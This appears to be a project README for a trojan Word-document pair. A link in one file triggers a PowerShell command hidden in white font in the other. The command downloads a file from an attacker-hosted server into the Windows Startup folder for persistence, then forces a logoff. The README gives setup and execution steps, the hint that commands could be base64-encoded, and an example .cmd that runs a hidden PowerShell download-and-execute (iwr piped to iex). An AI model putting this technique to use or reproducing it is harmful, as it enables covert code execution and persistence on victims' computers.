# SuspiciousWordDocuments
You have received two Microsoft Word documents. Are the links safe?

# Description
Things aren't always what they seem when it comes to links. One document contains several links to different things on the web. The other looks like another plain document.
The RealJuicyWebLinks.docx file has a link that executes a PowerShell Command contained in Document1.docx. Scenario: The Document1 commands are a way to establish persistence by grabbing the contents of a file from a hosted webserver and it's deposited in the user's Startup folder as .cmd. A shutdown /l command is the last step to execute the .cmd file upon login from the user.

# Remember
Document1 is saved in white font. 

This only works on Windows 10 and not windows 11. To work properly, save both files to downloads. Add your hosted IP, directory, and file to Document1 that you wished to be parsed/saved to the startup directory.

# How to use
Link number 1 must be copied and pasted to the Window's Search Box. Document1 cannot be opened at the same time of Window's Search Box execution. If testing, remember to kill Document1.

Add your IP, Directory, and filename to Document1. Note: commands could be encoded in base64.

Both files saved to Downloads.

If you edit RealJuicyWebLinks, the suspicious link may need to be updated as well back to the initial.

# Example .cmd
@echo off

powershell.exe -windowstyle hidden "(iwr https://YOUR IP/DIRECTORY/filename -UseBasicParsing) | iex"
